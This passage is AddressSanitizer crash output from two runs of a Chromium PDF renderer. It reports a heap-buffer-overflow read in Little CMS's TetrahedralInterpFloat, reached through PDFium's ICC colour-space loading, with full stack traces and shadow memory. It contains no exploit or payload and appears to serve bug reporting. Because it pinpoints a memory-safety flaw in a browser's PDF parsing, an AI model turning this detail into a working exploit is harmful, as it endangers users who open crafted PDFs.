    #29 0x7ffdfcef7d68 in CPDF_ImageLoader::Start(class CPDF_ImageObject const *, class CPDF_PageImageCache *, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_imageloader.cpp:35:31
    #30 0x7ffdfd3d25ce in CPDF_ImageRenderer::StartLoadDIBBase(void) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_imagerenderer.cpp:73:17
    #31 0x7ffdfd3d76f0 in CPDF_ImageRenderer::Start(class CPDF_ImageObject *, class CFX_Matrix const &, bool) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_imagerenderer.cpp:202:7
    #32 0x7ffdfd3f0881 in CPDF_RenderStatus::ContinueSingleObject(class CPDF_PageObject *, class CFX_Matrix const &, class PauseIndicatorIface *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_renderstatus.cpp:287:25
    #33 0x7ffdfd3dbfca in CPDF_ProgressiveRenderer::Continue(class PauseIndicatorIface *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_progressiverenderer.cpp:95:29
    #34 0x7ffdfd44f04c in `anonymous namespace'::RenderPageImpl C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\cpdfsdk_renderpage.cpp:87:23

SUMMARY: AddressSanitizer: heap-buffer-overflow C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsintrp.c:664:18 in TetrahedralInterpFloat
Shadow bytes around the buggy address:
  0x12712ba40000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x12712ba40280: fa[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12712ba40500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==60292==ADDITIONAL INFO

==60292==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7ffdfcbe26b2 in chrome_pdf::PaintManager::EnsureCallbackPending(void) C:\b\s\w\ir\cache\builder\src\pdf\paint_manager.cc:278:7
    #1 0x7ffe17223d93 in chrome_pdf::PostMessageReceiver::PostMessageW(class v8::Local<class v8::Value>) C:\b\s\w\ir\cache\builder\src\pdf\post_message_receiver.cc:136:7
    #2 0x7ffdffb5e4eb in mojo::SimpleWatcher::Context::Notify(unsigned int, struct MojoHandleSignalsState, unsigned int) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc:103:13


Command line: `"c:\src\asan\chromium-148.0.7755.0-win64-asan\chrome.exe" --type=renderer --no-pre-read-main-dll --pdf-renderer --no-sandbox --file-url-path-alias="/gen=c:\src\asan\chromium-148.0.7755.0-win64-asan\gen" --video-capture-use-gpu-memory-buffer --lang=en-US --js-flags=--jitless --device-scale-factor=1 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=14 --time-ticks-at-unix-epoch=-1773420789686991 --launch-time-ticks=1135965273633 --metrics-shmem-handle=5768,i,15743082198528617774,14050602562216212906,2097152 --field-trial-handle=2156,i,8128045027055461948,1796410704301311027,262144 --enable-features=ProcessIsolationSettings --variations-seed-version --pseudonymization-salt-handle=2180,i,11404302952590773327,4945984850769894804,4 --trace-process-track-uuid=3190708999430457380 --mojo-platform-channel-handle=5512 /prefetch:1`


==60292==END OF ADDITIONAL INFO

==60292==ABORTING
    #0 0x7ffdfd15ce0d in TetrahedralInterpFloat C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsintrp.c:664:18
    #1 0x7ffdfd1602ce in Eval4InputsFloat C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsintrp.c:1065:8
    #2 0x7ffdfd1622fe in Eval5InputsFloat C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsintrp.c:1164:1
    #3 0x7ffdfd17c0bb in _LUTeval16 C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmslut.c:1333:14
    #4 0x7ffdfd1bf344 in cmsCreateExtendedTransform C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1247:13
    #5 0x7ffdfd1c0f72 in cmsCreateMultiprofileTransformTHR C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1281
    #6 0x7ffdfd1c0f72 in cmsCreateTransformTHR C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1322
    #7 0x7ffdfd1c0f72 in cmsCreateTransform C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1332:12
    #8 0x7ffdfd0dc29b in fxcodec::IccTransform::CreateTransformSRGB(class pdfium::span<unsigned char const, -1, unsigned char const *>) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcodec\icc\icc_transform.cpp:100:11
    #9 0x7ffdfceef123 in CPDF_IccProfile::CPDF_IccProfile(class fxcrt::RetainPtr<class CPDF_StreamAcc const>, unsigned int) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_iccprofile.cpp:27:7
    #10 0x7ffdfcedaad4 in pdfium::MakeRetain C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcrt\retain_ptr.h:206
    #11 0x7ffdfcedaad4 in CPDF_DocPageData::GetIccProfile(class fxcrt::RetainPtr<class CPDF_Stream const>) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:475:7
    #12 0x7ffdfceb6d22 in `anonymous namespace'::CPDF_ICCBasedCS::v_Load C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_colorspace.cpp:954:51
    #13 0x7ffdfceaffc4 in CPDF_ColorSpace::Load(class CPDF_Document *, class CPDF_Object const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_colorspace.cpp:559:27
    #14 0x7ffdfced89a7 in CPDF_DocPageData::GetColorSpaceInternal(class CPDF_Object const *, class CPDF_Dictionary const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:374:7
    #15 0x7ffdfced847a in CPDF_DocPageData::GetColorSpaceInternal(class CPDF_Object const *, class CPDF_Dictionary const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:321:16
    #16 0x7ffdfced7b11 in CPDF_DocPageData::GetColorSpaceGuarded C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:296
    #17 0x7ffdfced7b11 in CPDF_DocPageData::GetColorSpace(class CPDF_Object const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:288:10
    #18 0x7ffdfcecadbf in CPDF_DIB::LoadColorInfo(class CPDF_Dictionary const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:347:34
    #19 0x7ffdfcec594a in CPDF_DIB::LoadInternal(class CPDF_Dictionary const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:729:8
    #20 0x7ffdfcec86c6 in CPDF_DIB::StartLoadDIBBase(bool, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:196:8
    #21 0x7ffdfcf07af8 in CPDF_PageImageCache::Entry::StartGetCachedBitmap(class CPDF_PageImageCache *, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_pageimagecache.cpp:283:60
    #22 0x7ffdfcf07340 in CPDF_PageImageCache::StartGetCachedBitmap(class fxcrt::RetainPtr<class CPDF_Image>, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_pageimagecache.cpp:191:53
    #23 0x7ffdfcef7d68 in CPDF_ImageLoader::Start(class CPDF_ImageObject const *, class CPDF_PageImageCache *, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_imageloader.cpp:35:31
    #24 0x7ffdfd3d25ce in CPDF_ImageRenderer::StartLoadDIBBase(void) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_imagerenderer.cpp:73:17
    #25 0x7ffdfd3d76f0 in CPDF_ImageRenderer::Start(class CPDF_ImageObject *, class CFX_Matrix const &, bool) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_imagerenderer.cpp:202:7
    #26 0x7ffdfd3f0881 in CPDF_RenderStatus::ContinueSingleObject(class CPDF_PageObject *, class CFX_Matrix const &, class PauseIndicatorIface *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_renderstatus.cpp:287:25
    #27 0x7ffdfd3dbfca in CPDF_ProgressiveRenderer::Continue(class PauseIndicatorIface *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_progressiverenderer.cpp:95:29
    #28 0x7ffdfd44f04c in `anonymous namespace'::RenderPageImpl C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\cpdfsdk_renderpage.cpp:87:23
    #29 0x7ffdfd44f41d in CPDFSDK_RenderPageWithContext(class CPDF_PageRenderContext *, class CPDF_Page *, int, int, int, int, int, int, struct FPDF_COLORSCHEME_ const *, bool, class CPDFSDK_PauseAdapter *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\cpdfsdk_renderpage.cpp:117:3
    #30 0x7ffdfd47dbfa in FPDF_RenderPageBitmapWithColorScheme_Start C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\fpdf_progressive.cpp:84:3
    #31 0x7ffdfd47df30 in FPDF_RenderPageBitmap_Start C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\fpdf_progressive.cpp:127:10
    #32 0x7ffdfcc09639 in chrome_pdf::PDFiumEngine::ContinuePaint(unsigned __int64, class SkBitmap &) C:\b\s\w\ir\cache\builder\src\pdf\pdfium\pdfium_engine.cc:3598:7
    #33 0x7ffdfcc0849a in chrome_pdf::PDFiumEngine::Paint(class gfx::Rect const &, class SkBitmap &, class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> &, class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> &) C:\b\s\w\ir\cache\builder\src\pdf\pdfium\pdfium_engine.cc:879:11
    #34 0x7ffe1724c4d5 in chrome_pdf::PdfViewWebPlugin::DoPaint(class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> const &, class std::__Cr::vector<class chrome_pdf::PaintReadyRect, class std::__Cr::allocator<class chrome_pdf::PaintReadyRect>> &, class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> &) C:\b\s\w\ir\cache\builder\src\pdf\pdf_view_web_plugin.cc:2423:16
    #35 0x7ffe1724bdbc in chrome_pdf::PdfViewWebPlugin::OnPaint(class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> const &, class std::__Cr::vector<class chrome_pdf::PaintReadyRect, class std::__Cr::allocator<class chrome_pdf::PaintReadyRect>> &, class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> &) C:\b\s\w\ir\cache\builder\src\pdf\pdf_view_web_plugin.cc:2371:3
    #36 0x7ffdfcbe4641 in chrome_pdf::PaintManager::DoPaint(void) C:\b\s\w\ir\cache\builder\src\pdf\paint_manager.cc:379:12
    #37 0x7ffdfcbe8b30 in base::internal::DecayedFunctorTraits<void (chrome_pdf::PaintManager::*)(),base::WeakPtr<chrome_pdf::PaintManager> &&>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:740
    #38 0x7ffdfcbe8b30 in base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (chrome_pdf::PaintManager::*&&)(),base::WeakPtr<chrome_pdf::PaintManager> &&>,void,0>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:956
    #39 0x7ffdfcbe8b30 in base::internal::Invoker<base::internal::FunctorTraits<void (chrome_pdf::PaintManager::*&&)(),base::WeakPtr<chrome_pdf::PaintManager> &&>,base::internal::BindState<1,1,0,void (chrome_pdf::PaintManager::*)(),base::WeakPtr<chrome_pdf::PaintManager> >,void ()>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1069
    #40 0x7ffdfcbe8b30 in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl chrome_pdf::PaintManager::*&&)(void), class base::WeakPtr<class chrome_pdf::PaintManager> &&>, struct base::internal::BindState<1, 1, 0, void (__cdecl chrome_pdf::PaintManager::*)(void), class base::WeakPtr<class chrome_pdf::PaintManager>>, (void)>::RunOnce(class base::internal::BindStateBase *) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:982:12
    #41 0x7ffdff529728 in base::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:155
    #42 0x7ffdff529728 in base::TaskAnnotator::RunTaskImpl(struct base::PendingTask &) C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:229:34
    #43 0x7ffdff4f9931 in base::TaskAnnotator::RunTask C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h:112
    #44 0x7ffdff4f9931 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::LazyNow *) C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:475:23
    #45 0x7ffdff4f8793 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork(void) C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:346:40
    #46 0x7ffdff6672d7 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:42:55
    #47 0x7ffdff4fb67f in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class base::TimeDelta) C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:650:12
    #48 0x7ffdff5a225c in base::RunLoop::Run(class base::Location const &) C:\b\s\w\ir\cache\builder\src\base\run_loop.cc:135:14
    #49 0x7ffe09b0e85e in content::RendererMain(struct content::MainFunctionParams) C:\b\s\w\ir\cache\builder\src\content\renderer\renderer_main.cc:338:16
    #50 0x7ffdfb02b60f in content::RunOtherNamedProcessTypeMain(class std::__Cr::basic_string<char, struct std::__Cr::char_traits<char>, class std::__Cr::allocator<char>> const &, struct content::MainFunctionParams, class content::ContentMainDelegate *) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:762:14
    #51 0x7ffdfb02dd7b in content::ContentMainRunnerImpl::Run(void) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1152:10
    #52 0x7ffdfb021b6f in content::RunContentProcess(struct content::ContentMainParams, class content::ContentMainRunner *) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:358:36
    #53 0x7ffdfb022312 in content::ContentMain(struct content::ContentMainParams) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:371:10
    #54 0x7ffdea8c2b06 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:191:12
    #55 0x7ff7e2144807 in MainDllLoader::Launch(struct HINSTANCE__*, class base::TimeTicks) C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:204:12
    #56 0x7ff7e2142074 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:351:20
    #57 0x7ff7e263d043 in invoke_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #58 0x7ff7e263d043 in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #59 0x7fff0b47e8d6  (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #60 0x7fff0d0ac48b  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18008c48b)

0x120859b40288 is located 2268 bytes after 18348-byte region [0x120859b3b200,0x120859b3f9ac)
allocated by thread T0 here:
    #0 0x7ffe8a53c93f  (c:\src\asan\chromium-148.0.7755.0-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18004c93f)
    #1 0x7ffdea8c23c3 in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win_thunk.cpp:64
    #2 0x7ffdfcea4f39 in partition_alloc::PartitionRoot::AllocInternal C:\b\s\w\ir\cache\builder\src\base\allocator\partition_allocator\src\partition_alloc\partition_root.h:2145
    #3 0x7ffdfcea4f39 in partition_alloc::PartitionRoot::AllocInline C:\b\s\w\ir\cache\builder\src\base\allocator\partition_allocator\src\partition_alloc\partition_root.h:538
    #4 0x7ffdfcea4f39 in pdfium::internal::Alloc(unsigned __int64, unsigned __int64) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcrt\fx_memory_pa.cpp:47:9
    #5 0x7ffdfd14ec34 in _cmsDupMem C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmserr.c:116:15
    #6 0x7ffdfd1782bc in CLUTElemDup C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmslut.c:497:56
    #7 0x7ffdfd17e199 in cmsStageDup C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmslut.c:1260
    #8 0x7ffdfd17e199 in cmsPipelineCat C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmslut.c:1620:56
    #9 0x7ffdfd14ad64 in DefaultICCintents C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmscnvrt.c:616:14
    #10 0x7ffdfd1beed0 in cmsCreateExtendedTransform C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1165:11
    #11 0x7ffdfd1c0f72 in cmsCreateMultiprofileTransformTHR C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1281
    #12 0x7ffdfd1c0f72 in cmsCreateTransformTHR C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1322
    #13 0x7ffdfd1c0f72 in cmsCreateTransform C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1332:12
    #14 0x7ffdfd0dc29b in fxcodec::IccTransform::CreateTransformSRGB(class pdfium::span<unsigned char const, -1, unsigned char const *>) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcodec\icc\icc_transform.cpp:100:11
    #15 0x7ffdfceef123 in CPDF_IccProfile::CPDF_IccProfile(class fxcrt::RetainPtr<class CPDF_StreamAcc const>, unsigned int) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_iccprofile.cpp:27:7
    #16 0x7ffdfcedaad4 in pdfium::MakeRetain C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcrt\retain_ptr.h:206
    #17 0x7ffdfcedaad4 in CPDF_DocPageData::GetIccProfile(class fxcrt::RetainPtr<class CPDF_Stream const>) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:475:7
    #18 0x7ffdfceb6d22 in `anonymous namespace'::CPDF_ICCBasedCS::v_Load C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_colorspace.cpp:954:51
    #19 0x7ffdfceaffc4 in CPDF_ColorSpace::Load(class CPDF_Document *, class CPDF_Object const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_colorspace.cpp:559:27
    #20 0x7ffdfced89a7 in CPDF_DocPageData::GetColorSpaceInternal(class CPDF_Object const *, class CPDF_Dictionary const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:374:7
    #21 0x7ffdfced847a in CPDF_DocPageData::GetColorSpaceInternal(class CPDF_Object const *, class CPDF_Dictionary const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:321:16
    #22 0x7ffdfced7b11 in CPDF_DocPageData::GetColorSpaceGuarded C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:296
    #23 0x7ffdfced7b11 in CPDF_DocPageData::GetColorSpace(class CPDF_Object const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:288:10
    #24 0x7ffdfcecadbf in CPDF_DIB::LoadColorInfo(class CPDF_Dictionary const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:347:34
    #25 0x7ffdfcec594a in CPDF_DIB::LoadInternal(class CPDF_Dictionary const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:729:8
    #26 0x7ffdfcec86c6 in CPDF_DIB::StartLoadDIBBase(bool, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:196:8
    #27 0x7ffdfcf07af8 in CPDF_PageImageCache::Entry::StartGetCachedBitmap(class CPDF_PageImageCache *, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_pageimagecache.cpp:283:60
    #28 0x7ffdfcf07340 in CPDF_PageImageCache::StartGetCachedBitmap(class fxcrt::RetainPtr<class CPDF_Image>, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_pageimagecache.cpp:191:53
    #29 0x7ffdfcef7d68 in CPDF_ImageLoader::Start(class CPDF_ImageObject const *, class CPDF_PageImageCache *, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_imageloader.cpp:35:31
    #30 0x7ffdfd3d25ce in CPDF_ImageRenderer::StartLoadDIBBase(void) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_imagerenderer.cpp:73:17
    #31 0x7ffdfd3d76f0 in CPDF_ImageRenderer::Start(class CPDF_ImageObject *, class CFX_Matrix const &, bool) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_imagerenderer.cpp:202:7
    #32 0x7ffdfd3f0881 in CPDF_RenderStatus::ContinueSingleObject(class CPDF_PageObject *, class CFX_Matrix const &, class PauseIndicatorIface *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_renderstatus.cpp:287:25
    #33 0x7ffdfd3dbfca in CPDF_ProgressiveRenderer::Continue(class PauseIndicatorIface *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_progressiverenderer.cpp:95:29
    #34 0x7ffdfd44f04c in `anonymous namespace'::RenderPageImpl C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\cpdfsdk_renderpage.cpp:87:23

SUMMARY: AddressSanitizer: heap-buffer-overflow C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsintrp.c:664:18 in TetrahedralInterpFloat
Shadow bytes around the buggy address:
  0x120859b40000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x120859b40280: fa[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x120859b40500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==35364==ADDITIONAL INFO

==35364==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7ffdfcbe26b2 in chrome_pdf::PaintManager::EnsureCallbackPending(void) C:\b\s\w\ir\cache\builder\src\pdf\paint_manager.cc:278:7
    #1 0x7ffe17223d93 in chrome_pdf::PostMessageReceiver::PostMessageW(class v8::Local<class v8::Value>) C:\b\s\w\ir\cache\builder\src\pdf\post_message_receiver.cc:136:7
    #2 0x7ffdffb5e4eb in mojo::SimpleWatcher::Context::Notify(unsigned int, struct MojoHandleSignalsState, unsigned int) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc:103:13


